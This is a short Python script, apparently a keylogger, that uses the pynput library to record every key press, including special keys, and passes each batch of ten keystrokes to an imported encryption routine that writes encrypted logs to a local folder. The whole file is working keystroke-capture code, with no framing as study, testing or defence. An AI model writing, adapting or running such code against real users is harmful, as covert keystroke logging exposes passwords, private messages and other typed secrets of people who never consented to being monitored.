import os
from pynput import keyboard
from encryptor import encrypt_log

buffer = []

os.makedirs("logs", exist_ok=True)  # ✅ Creates logs/ folder if missing

def on_press(key):
    try:
        buffer.append(f"{key.char}")
    except AttributeError:
        buffer.append(f"{key}")  # For special keys like Key.space, Key.enter

    if len(buffer) >= 10:
        encrypt_log("".join(buffer))
        buffer.clear()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
